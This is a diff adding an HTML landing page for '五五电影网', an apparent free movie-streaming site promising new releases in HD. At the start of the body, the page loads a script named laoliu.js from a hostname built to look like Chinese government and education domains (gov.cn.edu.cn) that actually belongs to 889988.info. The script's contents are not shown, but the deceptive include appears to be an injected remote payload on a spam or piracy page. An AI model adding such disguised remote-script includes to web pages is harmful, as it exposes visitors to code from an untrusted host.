@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>五五电影网 - 免费在线高清电影</title>
+<meta name="description" content="五五电影网（wuwudianyingwang-h5）提供最新电影、电视剧、综艺在线观看，支持移动端自适应，极速播放，尽在 https://wuwudianyingwang-h5.github.io">
+<meta name="keywords" content="五五电影网, wuwudianyingwang-h5, 电影网站, 在线电影, 高清影视">
+<style>
+/* ===== 全局样式 ===== */
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: "Microsoft YaHei", Arial, sans-serif;
+}
+
+body {
+  background: #f4f6f8;
+  color: #333;
+  line-height: 1.6;
+}
+
+a {
+  text-decoration: none;
+  color: inherit;
+}
+
+/* ===== 导航栏 ===== */
+.nav {
+  position: fixed;
+  top: 0;
+  width: 100%;
+  background: linear-gradient(90deg, #1e3c72, #2a5298);
+  display: flex;
+  justify-content: space-around;
+  padding: 12px 0;
+  z-index: 999;
+}
+
+.nav a {
+  color: #fff;
+  font-size: 14px;
+  padding: 6px 12px;
+}
+
+/* ===== 各栏目通用 ===== */
+.section {
+  padding: 80px 20px 40px;
+  min-height: 100vh;
+}
+
+/* ===== 首页 ===== */
+#home {
+  background: linear-gradient(135deg, #ff6a00, #ee0979);
+  color: #fff;
+  text-align: center;
+}
+
+#home h1 {
+  font-size: 36px;
+  margin-bottom: 10px;
+}
+
+#home p {
+  font-size: 16px;
+}
+
+/* ===== 电影分类（卡片网格） ===== */
+#category {
+  background: #fff;
+}
+
+#category h2 {
+  text-align: center;
+  margin-bottom: 20px;
+  color: #2a5298;
+}
+
+.grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+  gap: 16px;
+}
+
+.card {
+  background: #fafafa;
+  border-radius: 8px;
+  padding: 20px;
+  text-align: center;
+  box-shadow: 0 2px 6px rgba(0,0,0,.1);
+}
+
+/* ===== 热门推荐（列表结构） ===== */
+#hot {
+  background: #1e3c72;
+  color: #fff;
+}
+
+#hot h2 {
+  text-align: center;
+  margin-bottom: 20px;
+}
+
+.list-item {
+  background: rgba(255,255,255,.1);
+  margin: 10px auto;
+  max-width: 600px;
+  padding: 14px;
+  border-left: 4px solid #ff6a00;
+}
+
+/* ===== 关于我们（左右布局） ===== */
+#about {
+  background: #eee;
+}
+
+.about-wrap {
+  display: flex;
+  flex-wrap: wrap;
+  align-items: center;
+  justify-content: center;
+  gap: 30px;
+}
+
+.about-text {
+  flex: 1 1 260px;
+}
+
+.about-text h2 {
+  color: #ee0979;
+}
+
+/* ===== 底部 ===== */
+.footer {
+  text-align: center;
+  padding: 20px;
+  background: #222;
+  color: #aaa;
+  font-size: 12px;
+}
+
+/* ===== 移动端适配 ===== */
+@media (max-width: 768px) {
+  .nav {
+    flex-wrap: wrap;
+  }
+  #home h1 {
+    font-size: 28px;
+  }
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 导航 -->
+<nav class="nav">
+  <a href="#home">首页</a>
+  <a href="#category">电影分类</a>
+  <a href="#hot">热门推荐</a>
+  <a href="#about">关于我们</a>
+</nav>
+
+<!-- 首页 -->
+<section id="home" class="section">
+  <h1>五五电影网</h1>
+  <p>官方网址：https://wuwudianyingwang-h5.github.io</p>
+  <p>移动端自适应 · 极速播放 · 免费在线电影</p>
+</section>
+
+<!-- 电影分类 -->
+<section id="category" class="section">
+  <h2>电影分类</h2>
+  <div class="grid">
+    <div class="card">动作片</div>
+    <div class="card">喜剧片</div>
+    <div class="card">爱情片</div>
+    <div class="card">科幻片</div>
+    <div class="card">恐怖片</div>
+    <div class="card">纪录片</div>
+  </div>
+</section>
+
+<!-- 热门推荐 -->
+<section id="hot" class="section">
+  <h2>热门推荐</h2>
+  <div class="list-item">🔥 最新院线大片在线观看</div>
+  <div class="list-item">🔥 高分经典电影合集</div>
+  <div class="list-item">🔥 独家高清综艺节目</div>
+</section>
+
+<!-- 关于我们 -->
+<section id="about" class="section">
+  <div class="about-wrap">
+    <div class="about-text">
+      <h2>关于五五电影网</h2>
+      <p>
+        五五电影网（wuwudianyingwang-h5）致力于为用户提供稳定、高清、免费的影视资源，
+        支持手机、平板、电脑多端自适应访问。
+      </p>
+    </div>
+  </div>
+</section>
+
+<!-- 底部 -->
+<footer class="footer">
+  © 2026 五五电影网 | https://wuwudianyingwang-h5.github.io
+</footer>
+
+</body>
+</html>
